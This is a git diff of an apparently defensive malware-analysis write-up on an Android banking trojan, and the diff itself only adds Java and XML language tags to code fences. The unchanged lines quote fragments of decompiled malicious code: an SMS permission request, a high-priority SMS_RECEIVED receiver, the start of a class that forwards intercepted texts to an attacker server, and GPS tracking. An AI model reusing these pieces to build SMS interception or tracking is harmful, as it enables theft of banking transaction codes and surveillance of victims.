@@ -135,7 +135,7 @@ So, upon opening the app, victim will see a dialog box asking for SMS permission
 ![Snipaste_2022-12-23_20-53-39-removebg-preview](https://user-images.githubusercontent.com/56353946/209339579-b9f59871-5b99-4cda-a330-e6a855bdd211.png)
 ![Snipaste_2022-12-23_20-55-41-removebg-preview](https://user-images.githubusercontent.com/56353946/209341216-00240392-318a-4bac-be41-dc908cc9bda0.png)
 
-```
+```Java
 public void requestPermission(){
        if (Build$VERSION.SDK_INT >= 23) {
           String[] stringArray = new String[]{"android.permission.READ_SMS","android.permission.BROADCAST_SMS","android.permission.RECEIVE_SMS","android.permission.SEND_SMS","android.permission.RECEIVE_MMS","android.permission.RECEIVE_WAP_PUSH"};
@@ -208,7 +208,7 @@ After send the data, the application will either shows this screen to the user.
 
 For SMS stealer behavior, the malicious application statically declares a broadcast receiver of BROADCAST_SMS in AndroidManifest file. The APK uses the broadcast receiver to listen for any incoming message and send the incoming SMS data to the attacker API server. Intently to get TAC code of the banking transaction for the illegal transaction.
 
-```
+```XML
 <receiver android:name="com.service.sms.SmsReceiver" android:permission="android.permission.BROADCAST_SMS" android:enabled="true" android:exported="true" android:priority="9999999" android:stopWithTask="false">
             <intent-filter android:priority="9999999">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
@@ -233,7 +233,7 @@ For SMS stealer behavior, the malicious application statically declares a broadc
 
 In the class MyReciever, the method onReceive will be triggered when an SMS is coming in and the application will send the SMS data to the attacker URL. Here's the code:
 
-```
+```Java
 public class SmsReceiver extends BroadcastReceiver {
     private static final String TAG = "SmsReceiver";
 
@@ -283,7 +283,7 @@ The onReceive method first checks if the action in the Intent object is "android
 
 Next, the method creates a new `SmsPush` object and sets its sender, body, and deviceId fields using the values it retrieved from the SMS message. It also sets the `interceptedTime` field to the current date and time using a `SimpleDateFormat` object. Finally, it creates a new `SmsPushRequest` object with the `SmsPush` object as an argument and executes it using the `executeRunnable` method from the `ThreadUtil` class.
 
-```
+```Java
 package com.service.sms.common.constants;
 
 /* loaded from: classes2.dex */
@@ -299,7 +299,7 @@ public class UrlConstant {
 After getting the SMS data, the app will send the data to the `UrlConstant.DEFAULT_SMS_PUSH URL` using an HTTP POST request and processes the response from the server to determine if the request was successful.
 
 ## Track GPS location
-```
+```Java
 JSONObject jSONObject = new JSONObject();
         LocationManager locationManager = (LocationManager) context.getSystemService("location");
         if (locationManager != null) {
